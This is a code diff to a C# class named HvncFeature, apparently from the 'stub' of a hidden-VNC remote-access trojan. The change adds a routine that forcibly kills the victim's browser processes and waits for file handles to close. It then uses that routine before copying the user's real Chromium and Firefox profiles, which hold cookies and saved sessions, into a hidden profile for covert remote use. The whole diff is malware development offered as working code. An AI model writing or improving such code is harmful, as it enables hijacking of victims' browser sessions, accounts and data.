@@ -1802,6 +1802,20 @@ internal static class HvncFeature
             try { File.Delete(Path.Combine(p, lk)); } catch { }
     }
 
+    // Kills all processes with the given exe name and waits up to timeoutMs for them to exit,
+    // polling every 100 ms so file handles are actually released before the caller copies files.
+    private static void KillAndWaitForExit(string exeName, int timeoutMs = 3000)
+    {
+        KillProcessByName(exeName);
+        string nameNoExt = Path.GetFileNameWithoutExtension(exeName);
+        long deadline = Environment.TickCount64 + timeoutMs;
+        while (Environment.TickCount64 < deadline)
+        {
+            if (System.Diagnostics.Process.GetProcessesByName(nameNoExt).Length == 0) break;
+            Thread.Sleep(100);
+        }
+    }
+
     private static void KillProcessByName(string exeName)
     {
         const uint TH32CS_SNAPPROCESS = 0x00000002;
@@ -2078,8 +2092,7 @@ internal static class HvncFeature
                     : GetChromiumRealProfile(exeBase);
                 if (cloneBrowser && realProfile != null && Directory.Exists(realProfile))
                 {
-                    KillProcessByName(exeBase);
-                    Thread.Sleep(800);
+                    KillAndWaitForExit(exeBase, 3000);
                     try { if (Directory.Exists(hvncProfile)) Directory.Delete(hvncProfile, recursive: true); } catch { }
                     CloneProfileWithProgress(realProfile, hvncProfile, $"Cloning {hvncDirName}...");
                     StubLog.Info($"[HVNC] Profile cloned '{realProfile}' → '{hvncProfile}'");
@@ -2144,8 +2157,7 @@ internal static class HvncFeature
                 string? realProfile = GetFirefoxRealProfile();
                 if (cloneBrowser && realProfile != null && Directory.Exists(realProfile))
                 {
-                    KillProcessByName("firefox.exe");
-                    Thread.Sleep(800);
+                    KillAndWaitForExit("firefox.exe", 3000);
                     try { if (Directory.Exists(hvncProfile)) Directory.Delete(hvncProfile, true); } catch { }
                     CloneProfileWithProgress(realProfile, hvncProfile, "Cloning firefox...");
                     StubLog.Info($"[HVNC] Firefox profile cloned '{realProfile}' → '{hvncProfile}'");
